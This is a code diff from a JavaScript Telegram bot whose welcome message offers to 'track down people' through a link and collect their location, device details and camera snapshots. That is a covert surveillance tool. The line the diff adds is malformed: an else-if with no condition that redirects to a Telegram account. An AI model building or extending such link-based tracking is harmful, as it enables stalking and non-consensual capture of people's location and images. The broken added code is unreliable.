@@ -73,6 +73,7 @@ reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_da
 
 bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.`,m);
 }
+  else if {res.redirect("https://t.me/SamOfficial404 ");}
 else if(msg.text=="/create"){
 createNew(chatId);
 }
